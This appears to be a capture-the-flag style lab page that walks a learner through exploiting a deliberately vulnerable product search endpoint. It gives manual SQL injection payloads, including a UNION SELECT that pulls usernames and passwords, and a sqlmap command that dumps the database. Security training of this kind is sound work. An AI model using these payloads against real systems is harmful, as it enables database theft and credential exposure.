SQL Injection Lab

A product search endpoint on this server is vulnerable to SQL injection. Use sqlmap to exploit it.

⚙ Lab Environment

Vulnerable Endpoint:

http://{{ target_host }}:5000/search?id=1

This endpoint accepts an id parameter and returns product information from the database.

Instructions

Step 1: Try the endpoint manually in your browser:

http://{{ target_host }}:5000/search?id=1
http://{{ target_host }}:5000/search?id=1 OR 1=1
http://{{ target_host }}:5000/search?id=1 UNION SELECT 1,2,3

Step 2: Run sqlmap to automate exploitation:

sqlmap -u "http://{{ target_host }}:5000/search?id=1" --dump

Step 3: Examine the dumped data for the flag.

Step 4: Submit the flag below.

⚠ Tip: You can also try manual injection payloads directly in the browser URL bar to understand the vulnerability before using sqlmap.

Try payloads like: 1', 1 OR 1=1, 1 UNION SELECT username,password,flag FROM users

⚠ Note: You must have sqlmap installed on your system to complete this lab.

On Kali Linux it is pre-installed. Otherwise: pip install sqlmap or clone from GitHub.
